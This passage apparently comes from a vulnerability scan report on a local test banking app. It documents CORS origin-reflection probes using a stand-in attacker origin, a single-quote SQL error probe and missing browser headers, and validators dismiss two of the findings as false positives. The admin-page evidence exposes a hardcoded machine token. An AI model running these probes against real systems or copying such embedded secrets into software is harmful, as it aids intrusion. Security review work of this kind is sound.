A request with Origin: https://evil.example received Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true.

REQUEST:
GET http://localhost:8081/api/payments/transfer
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:15:19 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/payments/transfer
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:15:19 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
The CORS headers are present, but this route does not use browser-managed credentials. An anonymous POST receives 401 with `Missing or invalid Authorization header`, every supplied machine-token session was rejected, and no request carried cookies; the endpoint therefore requires an explicit Authorization machine token rather than an ambient session cookie. The reflected headers can be observed on the 405/401 responses, but they do not give an attacker access to a user's transfer data or bypass authentication, so the scanner's credentialed-access claim is not established.

## 46. Transaction API reflects arbitrary CORS origins

- Finding reference: URBN-048
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The transaction history endpoint reflects an arbitrary Origin value in the Access-Control-Allow-Origin response header while returning financial transaction records.

### Impact
JavaScript hosted on an attacker-controlled origin could read transaction records through a victim's browser when the endpoint is reachable. The observed endpoint was also accessible without authentication, which limits the additional impact of the CORS misconfiguration.

### Likelihood
Exploitation of the CORS behavior is straightforward because the supplied untrusted origin was accepted. Overall severity is low because the transaction data was already available through an unauthenticated request.

### Recommendation
Configure an explicit allowlist containing only trusted application origins. If cross-origin access is not required, omit CORS response headers and restrict the API to same-origin requests. Do not reflect arbitrary Origin values.

### Evidence
```
A GET request sent without authentication and with Origin: https://evil.example returned HTTP 200, Access-Control-Allow-Origin: https://evil.example, and JSON transaction history containing amounts, descriptions, account IDs, receipt numbers, and TOTP status.
```

### Request Evidence
```
GET /api/transactions?account_id=1&page=1&per_page=15 with Origin: https://evil.example and no authentication.
```

### Response Evidence
```
HTTP 200 with access-control-allow-origin: https://evil.example and JSON transaction history.
```

### Validation Note
The scanner's key claim that the transaction records are returned without authentication is false. Repeating the exact request anonymously returned 401 with only a generic authentication error; a named session without a usable Authorization header also returned 401. A supplied bearer-token session was required to reach authenticated behavior, and the request evidence shows no cookies, so a page on an attacker-controlled origin cannot cause the browser to attach this credential ambiently. The server does reflect Origin, including on an authenticated admin response, but in this authentication model that header alone does not expose transaction data cross-origin.

## 47. Transaction API returns verbose database errors and stack traces

- Finding reference: URBN-049
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27
- CVSS: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

### Description
The unauthenticated transaction endpoint returns raw MariaDB errors and a full PHP stack trace when the sort parameter contains malformed input. The response discloses SQL fragments, source file paths, line numbers, class names, and application routing details.

### Impact
An unauthenticated attacker can use the disclosed database and application internals to better understand the query structure and source layout, making targeted attacks easier to develop.

### Likelihood
High. Adding a single quote to the public sort parameter reliably triggered the verbose error response without authentication.

### Recommendation
Return a generic error response to clients and record exception details only in server-side logs. Disable debug error output in production. Validate the sort parameter against an allowlist of permitted column names and sort directions before constructing the query.

### Evidence
```
The unauthenticated request returned HTTP 500 JSON with code INTERNAL_ERROR. The response included SQLSTATE[42000], MariaDB error 1064, the query fragment `DESC LIMIT ? OFFSET ?`, `/var/www/html/src/Models/Transaction.php` line 41, and a stack trace through TransactionController.php, Router.php, and public/index.php.
```

### Request Evidence
```
GET /api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27 without authentication.
```

### Response Evidence
```
HTTP 500 JSON with code INTERNAL_ERROR and raw SQL error plus full PHP stack trace.
```

### Validation Note
The scanner's key assumption is wrong: the transaction endpoint is not accessible without authentication. A direct anonymous comparison of both the valid sort value and the exact malformed sort value returned the same HTTP 401 JSON response stating `Missing or invalid Authorization header`, with no SQL error, file path, or stack trace. The concrete benign explanation is that authentication middleware handles the request before the transaction query runs, so the reported unauthenticated information disclosure is not reachable.

## 48. Banking page lacks browser security headers

- Finding reference: URBN-073
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/admin/
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N)

### Description
The admin HTML response does not include Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy headers.

### Impact
The missing controls may increase the impact of separate client-side vulnerabilities and leave the interface exposed to framing attacks.

### Likelihood
The configuration is confirmed, but no direct exploit or sensitive data exposure was demonstrated.

### Recommendation
Set an appropriate Content-Security-Policy, prevent unauthorized framing with frame-ancestors, add X-Content-Type-Options: nosniff, and define a Referrer-Policy.

### Evidence
```
GET /admin/ returned 200 with HTML, but the response headers contained none of the listed browser security headers.

REQUEST:
GET http://localhost:8081/admin/
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:29:35 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Request Evidence
```
GET http://localhost:8081/admin/
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:29:35 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
